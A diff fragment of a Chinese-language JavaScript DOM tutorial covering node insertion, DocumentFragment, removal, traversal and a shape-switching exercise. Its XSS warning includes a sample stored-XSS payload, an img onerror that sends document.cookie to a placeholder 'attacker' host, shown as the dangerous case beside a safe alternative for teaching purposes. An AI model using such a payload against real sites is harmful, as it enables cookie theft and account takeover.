+listItem3.textContent = '項目 3';
+ul.append(listItem2, listItem3); // 項目 1, 2, 3
+
+// 插入到畫面
+document.body.append(ul);
+document.body.append(ul.cloneNode(true));
+```
+
+{% note info %}
+`cloneNode()` 方法的參數預設為 `false`，代表僅複製節點本身（不包含子元素與內容）；若設為 `true`，則會連同所有子節點與內容一併複製。
+{% endnote %}
+
+### 插入方式
+這一節將系統性整理各種插入方式，並說明它們的適用場景與差異，幫助你寫出更簡潔、易維護的程式碼。常見插入位置分兩類：
+
+#### 基礎操作
+- 內部插入（成為子節點）：`append`（尾端）、`prepend`（開頭）
+- 外部插入（與該元素同一層）：`before`（自身之前）、`after`（自身之後）、`replaceWith`（以新節點取代自身）
+
+```javascript
+const container = document.querySelector('#news');
+
+// 內部插入
+container.prepend(title);     // 最前面
+container.append(desc);       // 最後面
+
+// 外部插入（相對於 container）
+container.before(document.createElement('hr'));   // container 前
+container.after(document.createElement('hr'));    // container 後
+
+// 取代自身
+// container.replaceWith(card);
+```
+
+`insertBefore` 與 `insertAdjacent` 系列方法屬於進階且精細的 DOM 操作工具，能讓你將新節點或內容插入到特定節點的精確位置（如某個子節點之前、之後或指定錨點）。這些方法在需要高度控制插入位置時非常實用，尤其適合動態產生複雜結構或進行細部調整。雖然日常開發中較常用 `append`、`prepend` 等現代方法，
+
+```javascript
+// 1) 舊式但仍實用：insertBefore(newNode, referenceNode)
+const list = document.querySelector('#list');
+const item = document.createElement('li');
+item.textContent = '插在第二個項目前';
+list.insertBefore(item, list.children[1]);
+
+// 2) insertAdjacentElement/HTML/Text：四個錨點
+// 參數：position = 'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'
+const box = document.querySelector('.box');
+box.insertAdjacentHTML('beforebegin', '<p>在 .box 之前</p>');
+box.insertAdjacentHTML('afterbegin', '<p>作為子節點的最前面</p>');
+box.insertAdjacentHTML('beforeend', '<p>作為子節點的最後面</p>');
+box.insertAdjacentHTML('afterend', '<p>在 .box 之後</p>');
+```
+
+#### 一次性插入大量
+在產生大量節點時，反覆把節點直接插進畫面，瀏覽器會一次次地「改動真實 DOM」重新渲染，導致多次回流/重繪。DocumentFragment 是一個「記憶體容器」，不會觸發畫面更新。我們可以先把內容在記憶體組裝好，再一次插入畫面，減少重複的渲染成本。
+
+- 記憶體組裝指的是在「離線容器」中把多個節點先做好（新增、排序、屬性與事件綁定），這些操作都還不會影響螢幕。
+- 最後再把整個容器一次性插入真實 DOM，瀏覽器只需處理一次變動，效能更好。
+
+##### 對照範例：逐筆 append vs Fragment 一次插入
+```javascript
+const list = document.querySelector('#list');
+
+// A. 逐筆 append（每次都動到真實 DOM）
+console.time('append-loop');
+for (let i = 1; i <= 1000; i++) {
+  const li = document.createElement('li');
+  li.textContent = `項目 ${i}`;
+  list.appendChild(li); // 每次都觸碰到真實 DOM
+}
+console.timeEnd('append-loop');
+
+// B. 以 Fragment 記憶體組裝，再一次插入
+console.time('fragment-once');
+const frag = document.createDocumentFragment();
+for (let i = 1; i <= 1000; i++) {
+  const li = document.createElement('li');
+  li.textContent = `項目 ${i}`;
+  frag.appendChild(li); // 只在記憶體中操作
+}
+list.appendChild(frag); // 只動真實 DOM 一次
+console.timeEnd('fragment-once');
+```
+
+{% note info %}
+**差異重點：**
+- 逐筆 append：對真實 DOM 進行 N 次插入，可能造成 N 次排版/重繪。
+- Fragment：先在記憶體組裝，最後 1 次插入，通常更快、更穩定。
+- Fragment 插入後「自身會清空」，因為子節點被搬移到目標容器（這是預期行為）。
+{% endnote %}
+
+#### 大量字串時的替代方案
+- 若你握有已生成好的 HTML 字串，`insertAdjacentHTML('beforeend', html)` 可能更快；直接把 HTML Code 插入指定處，但要注意 XSS 安全。
+- 批次更新期間，可先把容器設為 `display: none`，更新完再顯示，亦能降低中間的重繪干擾（但會造成佈局跳動）。
+
+```html
+<div id="cards"></div>
+
+<script>
+const cards = document.getElementById('cards');
+
+// A. insertAdjacentHTML：一次插入大量已組好的 HTML 字串
+const html = Array.from({ length: 5 }, (_, i) => `
+  <article class="card">
+    <h3>卡片標題 ${i + 1}</h3>
+    <p>這是卡片內容段落，示範以 HTML 片段插入。</p>
+  </article>
+`).join('');
+
+cards.insertAdjacentHTML('beforeend', html);
+
+// B. display: none 批次更新（避免中途重繪干擾）
+cards.style.display = 'none';
+cards.insertAdjacentHTML('beforeend', '<article class="card">額外卡片 A</article>');
+cards.insertAdjacentHTML('beforeend', '<article class="card">額外卡片 B</article>');
+cards.style.display = '';
+</script>
+```
+
+{% note warning %}
+**XSS 是什麼？**
+XSS（跨站腳本攻擊，Cross-Site Scripting）：攻擊者將惡意腳本（多為 `<script>` 或事件屬性如 `onerror`）注入到頁面，導致在受害者瀏覽器中執行，可能竊取 Cookie、Token、操作使用者帳號等。
+
+- 風險來源：直接把「未過濾的使用者輸入」或「不可信來源的 HTML 字串」插入到頁面，如 `innerHTML`、`insertAdjacentHTML`。
+- 基本防護：
+  - 對外部輸入做輸入驗證與輸出轉義（escape HTML 特殊字元）。
+  - 優先使用「文字 API」如 `textContent` 替代插入 HTML 字串。
+  - 只在必要時使用 `insertAdjacentHTML`，且來源必須可信。
+  - 可搭配 CSP（Content Security Policy）限制內聯腳本執行。
+
+- 情境：儲存型 XSS（Stored XSS）
+  1) 攻擊者在留言/表單輸入惡意內容（例如 `<img src=x onerror="steal()">`）
+  2) 後端未清洗即存入資料庫
+  3) 頁面渲染從資料庫撈出，為了排版用 `innerHTML/insertAdjacentHTML` 插入
+  4) 惡意事件屬性被瀏覽器解析並執行，攻擊者即可在該頁以使用者身分做任何事
+
+```javascript
+// 危險：直接將後端回傳的 HTML 串進列表
+const list = document.querySelector('#comments');
+const commentHtml = '<p>Nice!</p><img src=x onerror="fetch(\'https://attacker\/?c=\'+document.cookie)">';
+list.insertAdjacentHTML('beforeend', '<li>'+ commentHtml +'</li>');
+
+// 建議：改以文字與節點操作，或先用白名單清洗後再插入
+const item = document.createElement('li');
+const p = document.createElement('p');
+p.textContent = 'Nice!';
+item.append(p);
+list.append(item);
+```
+{% endnote %}
+
+### 移除節點與清空
+在操作 DOM 時，除了插入新節點之外，「移除」與「清空」也是常見且重要的需求。例如：刪除不再需要的卡片、移除某個區塊，或是將容器內容全部清空以便重新渲染。以下將介紹現代與傳統的節點移除方法，以及安全清空內容的技巧。
+
+```javascript
+// 移除自身（現代）
+card.remove();
+
+// 傳統作法：由父節點移除
+if (card.parentNode) {
+  card.parentNode.removeChild(card);
+}
+
+// 清空容器（保留節點本身）
+const panel = document.querySelector('.panel');
+panel.innerHTML = ''; // 快速，但會銷毀事件與狀態
+
+// 更保守清空方式
+while (panel.firstChild) {
+  panel.removeChild(panel.firstChild);
 }
 ```
 
-### 插入元素
+### 節點遍歷與定位
+這一節將介紹常用的節點遍歷方法，幫助你靈活取得父層、子層、兄弟節點，並說明如何以不同起點進行元素搜尋，讓你能更精確地操作網頁結構。
+
+#### 基礎操作
 ```javascript
-// 在指定元素前插入新元素
-let newElement = document.createElement("p");
-newElement.textContent = "插入的段落";
-let targetElement = document.getElementById("target");
-targetElement.parentNode.insertBefore(newElement, targetElement);
+const node = document.querySelector('.item.active');
+
+// 往上（父層）
+const parent = node.parentElement;        // 或 parentNode（可能是 Document）
+const form = node.closest('form');        // 往上尋找符合選擇器的最近祖先
+
+// 往下（子層）
+const children = node.children;           // HTMLCollection（僅元素）
+const first = node.firstElementChild;     // 第一個子元素
+const last = node.lastElementChild;       // 最後一個子元素
+
+// 同層前後
+const prev = node.previousElementSibling; // 前一個兄弟元素
+const next = node.nextElementSibling;     // 後一個兄弟元素
 ```
 
-# 課堂作業
+#### 指定起點向下搜尋
+`document.querySelector()` 會從整份文件找，而「任何元素節點」也都可以當成查找起點。例如：
+```javascript
+const section = document.querySelector('#profile');
+// 只在 section 範圍內找子孫層的 .avatar img
+const avatarImg = section.querySelector('.avatar img');
+// 找到多個時用 querySelectorAll（NodeList，可 forEach）
+const items = section.querySelectorAll('li.item');
+```
 
-透過實際的專案練習，我們可以將所學知識整合應用。以下作業將幫助您鞏固學習成果，並培養解決實際問題的能力。建議您獨立完成這些作業，這將是檢驗學習效果的最佳方式。
+{% note info %}
+**:scope 的用法**
+- 在複雜選擇器中，`:scope` 代表當前查找的起點元素。
+- 範例：`section.querySelector(':scope > ul > li:first-child')` 僅會在 `section` 直系子層的 `ul` 裡取第一個 `li`。
+{% endnote %}
 
-## 作業一：簡單的待辦事項清單
+#### 範例：將項目上移/下移（與前/後兄弟交換）
+```javascript
+function moveUp(item) {
+  const prev = item.previousElementSibling;
+  if (prev) prev.before(item); // 把自己插到前一個前面
+}
 
-建立一個待辦事項清單，具備以下功能：
-1. 可以添加新的待辦項目
-2. 點擊項目可以標記為完成（加上刪除線）
-3. 可以刪除已完成的項目
-4. 顯示未完成項目的數量
+function moveDown(item) {
+  const next = item.nextElementSibling;
+  if (next) next.after(item);  // 把自己插到下一個後面
+}
+```
 
-## 作業二：顏色選擇器
+{% note primary %}
+**小抄：常用 API 對照**
+- 內部插入：`append`（尾）、`prepend`（首）
+- 外部插入：`before`（前）、`after`（後）、`replaceWith`（取代自身）
+- 舊式插入：`insertBefore(new, ref)`（在 ref 前）
+- 精準錨點：`insertAdjacent*('beforebegin'|'afterbegin'|'beforeend'|'afterend')`
+- 移除：`remove()`、`parentNode.removeChild(node)`
+- 建立/複製：`createElement`、`createTextNode`、`cloneNode(true|false)`
+- 遍歷：`parentElement`、`children`、`first/lastElementChild`、`previous/nextElementSibling`、`closest`
+{% endnote %}
 
+{% note danger %}
+**常見陷阱**
+- 使用 `innerHTML += '...'` 會重新解析整段 HTML，可能丟失既有節點的事件/狀態。
+- 直接覆蓋 `outerHTML` 會替換整個元素（包含自身），原本的 JS 參考會失效。
+- 事件綁定在被移除或被取代的節點上會一併消失，請視需要改用事件委派。
+{% endnote %}
+
+## 課堂練習
+{% tabs classtry,1 %}
+<!-- tab 說明 -->
+1. 參考 HTML 與 CSS 為 div 元素設計四種形狀（正方形、圓形、三角形、星形），並以 class 切換方式實現。
+2. 請撰寫 JavaScript 程式碼，讓使用者可透過按鈕切換形狀，並可改變顏色代碼即時變更 div 的背景色。
+
+```html
+<style>
+  .form-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 16px;
+    margin: 0 auto;
+
+    button {
+      padding: 8px 16px;
+      border: 1px solid #ccc;
+      background: #f5f5f5;
+    }
+
+    input {
+      width: 40px;
+      height: 40px;
+      border: none;
+      background: none;
+      cursor: pointer;
+    }
+  }
+
+  #preview-block {
+    background-color: red;
+    margin: 0 auto;
+    width: 100px;
+    height: 100px;
+
+    &.square {
+      clip-path: polygon(0 0, 100% 0, 100% 100%, 0% 100%);
+    }
+
+    &.circle {
+      clip-path: circle(50% at 50% 50%);
+    }
+
+    &.triangle {
+      clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+    }
+
+    &.star {
+      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+    }
+  }
+</style>
+
+<form class="form-container">
+  <button type="button" value="square">正方形</button>
+  <button type="button" value="circle">圓形</button>
+  <button type="button" value="triangle">三角形</button>
+  <button type="button" value="star">星星</button>
+  <input type="color" value="#ff0000" />
+</form>
+<hr />
+<div id="preview-block" class="square"></div>
+
+<script>
+  // todo...
+</script>
+```
+<!-- endtab -->
+<!-- tab 解答-->
+```javascript
+const zone = document.getElementById("preview-block");
+let clr = zone.style.backgroundColor; //red
+
+const buttons = document.querySelectorAll("button");
+buttons.forEach(button => {
+  button.addEventListener("click", () => {
+    trans(button.value);
+  });
+});
+
+const colorInput = document.querySelector("input");
+colorInput.addEventListener("change", (e) => {
+  color(e.target.value);
+});
+
+function trans(re) {
+  switch (re) {
+    case "square":
+      zone.classList.add("square");
+      zone.classList.remove("circle");
+      zone.classList.remove("triangle");
+      zone.classList.remove("star");
+      break;
+    case "circle":
+      zone.classList.add("circle");
+      zone.classList.remove("square");
+      zone.classList.remove("triangle");
+      zone.classList.remove("star");
+      break;
+    case "triangle":
+      zone.classList.add("triangle");
+      zone.classList.remove("square");
+      zone.classList.remove("circle");
+      zone.classList.remove("star");
+      break;
+    case "star":
+      zone.classList.add("star");
+      zone.classList.remove("square");
+      zone.classList.remove("circle");
+      zone.classList.remove("triangle");
+      break;
+  }
+}
+
+function color(re) {
+  clr = re;
+}
+
+// 如可以，請重購代碼至 10 行內
+```
+<!-- endtab -->
+{% endtabs %}
+
+## 自我挑戰
 顏色選擇器是一個實用的工具，結合了多種 DOM 操作技巧。這個作業將考驗您對事件處理、樣式操作和用戶介面設計的綜合運用能力。
 
 建立一個顏色選擇器，具備以下功能：
-1. 使用 RGB 滑桿控制顏色
-2. 即時預覽顏色效果
-3. 可以儲存喜歡的顏色
-4. 顯示當前顏色的十六進位值
+1. 即時隨機預覽顏色效果
+2. 顯示當前顏色的十六進位值
+3. 可使用 RGB 滑桿或輸入值控制顏色
+4. 可使用操作事件按鈕改變顏色
 
-{% note success %}
-**跟著做：**
-完成上述作業後，可以嘗試添加更多功能，如：
-- 鍵盤快捷鍵支援
-- 本地儲存功能
-- 動畫效果
-{% endnote %}
+挑戰示範一：
+- [view](https://summer10920.github.io/studies_TeachDemo_JSJQ/vanillaJS/colorEditor)
+- [code](https://github.com/summer10920/studies_TeachDemo_JSJQ/blob/master/vanillaJS/colorEditor/index.html)
+
+商務示範二：
+{% codepen summer10920 abRMXwm [html,css,result 900] %}
 
 # 總結
 
@@ -1772,103 +2379,6 @@ targetElement.parentNode.insertBefore(newElement, targetElement);
 {% note default %}
 **延伸閱讀：**
 - [MDN Web Docs - DOM](https://developer.mozilla.org/zh-TW/docs/Web/API/Document_Object_Model)
-- [MDN Web Docs - BOM](https://developer.mozilla.org/zh-TW/docs/Web/API/Window)
+- [MDN Web Docs - BOM](https://developer.mozilla.org/en-US/docs/Web/API/Window)
 - [JavaScript 事件參考](https://developer.mozilla.org/zh-TW/docs/Web/Events)
-{% endnote %}
-
-## cookie 物件
-`document.cookie` 提供了對瀏覽器 cookie 的存取功能。cookie 是儲存在用戶瀏覽器中的小型文字檔案，常用於儲存用戶偏好設定、會話資訊等。
-
-```javascript
-// 設定 cookie
-document.cookie = "username=John; expires=Thu, 18 Dec 2024 12:00:00 UTC; path=/";
-
-// 讀取所有 cookie
-console.log(document.cookie); // "username=John; theme=dark; language=zh-TW"
-
-// 設定 cookie 的完整語法
-document.cookie = "name=value; expires=date; path=path; domain=domain; secure; samesite=value";
-```
-
-{% note info %}
-**cookie 參數說明：**
-- `name=value`：cookie 的名稱和值
-- `expires=date`：過期時間（GMT 格式）
-- `path=path`：cookie 的作用路徑
-- `domain=domain`：cookie 的作用域名
-- `secure`：僅在 HTTPS 連線時傳送
-- `samesite=value`：防止 CSRF 攻擊（Strict/Lax/None）
-{% endnote %}
-
-**常用 cookie 操作：**
-- `document.cookie = "name=value"` - 設定簡單 cookie
-- `document.cookie = "name=value; expires=date"` - 設定過期時間
-- `document.cookie = "name=value; path=/"` - 設定作用路徑
-- `document.cookie = "name=; expires=Thu, 01 Jan 1970 00:00:00 UTC"` - 刪除 cookie
-
-{% note warning %}
-**cookie 使用注意事項：**
-- 每個 cookie 最大 4KB
-- 每個域名最多 20 個 cookie
-- 需要考慮安全性（XSS、CSRF 攻擊）
-- 現代開發中建議使用 localStorage/sessionStorage
-- 某些瀏覽器可能阻擋第三方 cookie
-{% endnote %}
-
-```javascript demo.js
-// localStorage 範例
-// ----------------------------------------------------------------
-// 儲存用戶偏好設定
-localStorage.setItem('theme', 'dark');
-localStorage.setItem('language', 'zh-TW');
-
-// 讀取儲存的資料
-console.log('主題：', localStorage.getItem('theme')); // 主題：dark
-console.log('語言：', localStorage.getItem('language')); // 語言：zh-TW
-
-// 檢查儲存空間是否可用，或者儲存情況都可能拋出異常
-function checkStorageSupport() {
-  try {
-      localStorage.setItem('test', 'test');
-      localStorage.removeItem('test');
-  
-      // 以下情況可能會拋出異常：
-      // 1. 儲存空間已滿 （超過 5-10MB 限制）
-      // 2. 瀏覽器隱私模式下無法使用 localStorage
-      // 3. 用戶禁用了 Web Storage 功能
-      // 4. 存取權限被拒絕
-      // 5. 儲存的值不是合法的字串格式
-      return true; // 支援 localStorage
-  } catch (e) {
-      console.log('localStorage 不可用：', e.message);
-      return false; // 不支援 localStorage
-  }
-}
-
-// 清除特定資料
-localStorage.removeItem('theme');
-
-// sessionStorage 範例
-// ----------------------------------------------------------------
-// 儲存表單狀態
-sessionStorage.setItem('formData', JSON.stringify({
-  name: '張三',
-  email: 'zhang@example.com',
-  message: '這是一個測試訊息'
-}));
-
-// 讀取表單資料
-const formData = JSON.parse(sessionStorage.getItem('formData'));
-console.log('表單資料：', formData);
-
-// 清除特定資料
-sessionStorage.clear(); // 清除所有 sessionStorage 資料
-```
-
-{% note info %}
-**小技巧：**
-- localStorage 資料會永久保存，除非手動刪除
-- sessionStorage 資料在關閉分頁後會自動清除
-- 儲存容量限制約為 5-10MB
-- 只能儲存字串，物件需要先轉換為 JSON
 {% endnote %}
